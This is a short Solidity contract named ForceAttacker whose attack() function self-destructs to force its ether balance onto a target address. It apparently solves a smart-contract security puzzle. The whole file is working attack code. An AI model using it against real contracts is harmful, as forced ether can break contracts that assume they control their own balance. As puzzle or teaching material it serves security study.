// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract ForceAttacker {
    address force;
    constructor(address _forceAddress) {
        force = _forceAddress;
    }

    receive() external payable {}

    function attack() external {
        selfdestruct(payable(force));
    }
}
